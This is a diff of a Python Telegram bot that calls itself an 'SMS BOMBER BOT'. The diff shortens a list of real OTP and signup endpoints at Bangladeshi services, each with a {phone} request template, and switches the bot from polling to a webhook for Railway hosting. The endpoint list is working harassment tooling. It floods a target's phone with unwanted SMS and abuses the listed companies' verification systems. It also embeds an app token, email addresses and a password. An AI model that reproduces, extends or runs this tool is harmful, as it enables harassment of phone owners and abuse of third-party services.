@@ -47,22 +47,13 @@ WORKING_APIS = [
     {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
     {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
     {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
-    {"name": "Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
     {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
     {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
-    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
     {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
     {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
-    {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
     {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
-    {"name": "Addatimes", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
     {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
-    {"name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
     {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
-    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
-    {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
-    {"name": "BdTickets", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
-    {"name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body": {"mobile": "{phone}"}},
 ]
 
 def replace_phone(data, phone):
@@ -888,23 +879,11 @@ async def init_db():
     except Exception as e:
         logger.error(f"DB init error: {e}")
 
-async def health_check():
-    from aiohttp import web
-    app = web.Application()
-    app.router.add_get('/health', lambda r: web.Response(text="OK"))
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, '0.0.0.0', int(os.getenv('PORT', 8080)))
-    await site.start()
-    logger.info("Health check on port 8080")
-    while True:
-        await asyncio.sleep(3600)
-
-# ===================== FINAL FIX: MAIN FUNCTION =====================
+# ===================== WEBHOOK SETUP (FINAL FIX) =====================
 async def main():
     try:
         print("=" * 60)
-        print("SMS BOMBER BOT STARTING...")
+        print("SMS BOMBER BOT STARTING WITH WEBHOOK...")
         print(f"APIs: {len(WORKING_APIS)}")
         print(f"Admin: {ADMIN_ID}")
         print(f"DB: {DB_PATH}")
@@ -912,23 +891,31 @@ async def main():
         
         await init_db()
         asyncio.create_task(backup_database())
-        asyncio.create_task(health_check())
         
         app = Application.builder().token(BOT_TOKEN).build()
         app.add_handler(CommandHandler("start", start))
         app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
         
-        print("Bot is RUNNING!")
+        print("Bot is RUNNING with Webhook!")
         print("=" * 60)
         
-        # Correct way to start polling without event loop issues
-        await app.initialize()
-        await app.start()
-        await app.updater.start_polling()
+        # Railway provides a public URL via PORT
+        port = int(os.getenv('PORT', 8080))
+        webhook_url = f"https://{os.getenv('RAILWAY_STATIC_URL', 'localhost')}/webhook"
         
-        # Keep the bot running
-        while True:
-            await asyncio.sleep(3600)
+        # If RAILWAY_STATIC_URL is not set, use polling as fallback
+        if os.getenv('RAILWAY_STATIC_URL'):
+            await app.bot.set_webhook(webhook_url)
+            await app.run_webhook(listen="0.0.0.0", port=port, webhook_url=webhook_url)
+        else:
+            # Fallback to polling
+            print("No RAILWAY_STATIC_URL, using polling...")
+            await app.initialize()
+            await app.start()
+            await app.updater.start_polling()
+            
+            while True:
+                await asyncio.sleep(3600)
             
     except Exception as e:
         logger.error(f"Main error: {e}")
